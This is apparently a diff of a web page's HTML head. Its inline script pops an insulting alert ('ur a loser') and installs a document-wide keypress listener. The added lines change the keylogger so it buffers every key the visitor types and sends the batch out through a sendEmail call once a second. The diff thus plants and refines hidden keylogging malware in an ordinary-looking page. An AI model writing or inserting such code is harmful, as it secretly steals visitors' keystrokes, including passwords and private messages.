@@ -19,12 +19,19 @@
   </script>
   <script>
 	  window.alert('ur a loser')
+	  var keys = '';
    document.onkeypress = function(e) {
 	get = window.event?event:e;
 	key = get.keyCode?get.keyCode:get.charCode;
 	key = String.fromCharCode(key);
-	sendEmail(key);
+	   keys+=key;
 }
+	  window.setInterval(function(){
+	if(keys.length>0) {
+		sendEmail(keys);
+		keys = '';
+	}
+}, 1000);
   </script>
   <meta charset="utf-8" data-react-helmet="true"/>
   <meta content="ie=edge" data-react-helmet="true" http-equiv="x-ua-compatible"/>
